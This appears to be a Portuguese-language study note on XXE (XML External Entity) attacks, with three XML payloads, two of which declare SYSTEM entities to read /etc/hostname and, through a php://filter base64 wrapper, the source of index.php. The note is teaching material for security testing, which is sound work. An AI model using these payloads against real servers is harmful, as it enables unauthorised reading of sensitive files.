Tags: #xml #web_vulnerability 
## **XXE External Entity Attack**

**XXE** é uma vulnerabilidade de segurança que afeta aplicações que processam dados XML. Ocorre quando uma aplicação processa um arquivo **[[XML]]** de forma insegura, permitindo que um atacante inclua entidades externas no XML que podem acessar arquivos sensíveis do servidor ou realizar requisições externas.
### Toda vez que tivermos um XML indo pro servidor e for possível manipular esse XML devemos testar ha existência de XXE
O xml permite declarar entidades um tipo de variável que pode ser definida no documento XML e ser utilizada dentro do documento. A declaração de uma entidade segue a seguinte sintaxe:
```
<!DOCTYPE aulaxxe
[<!ENTITY nome “Carlor Vieira”>]
>
<crowsec>
<user>
	<id>1</id>
	<nome>&nome;</nome>
</user>
<user>
	<id>2</id>
	<nome>luciane</nome>
</user>
</crowsec>
```

A entidade é referenciada no documento usando a sintaxe:
```$nome_da_entidade```
A falha acontece porque podemos definir o valor_da_entidade como qualquer valor onde podemos inserir códigos maliciosos e conseguir informações sigilosas. Primeiro depois do nome da variável vamos colocar o valor SYSTEM para a aplicação pegar o resultado de dentro do sistema.
```
<!DOCTYPE aulaxxe
[<!ENTITY nome SYSTEM “file:///etc/hostname”>]
>
<crowsec>
<user>
	<id>1</id>
	<nome>&nome;</nome>
</user>
<user>
	<id>2</id>
	<nome>luciane</nome>
</user>
</crowsec>
```

Então temos um LFI ou um XXE e usar php wrapper para ler arquivos.
```
<!DOCTYPE aulaxxe
[<!ENTITY nome SYSTEM “php://filter/convert.base64-encode/resource=index.php”>]
>
<crowsec>
<user>
	<id>1</id>
	<nome>&nome;</nome>
</user>
<user>
	<id>2</id>
	<nome>luciane</nome>
</user>
</crowsec>
```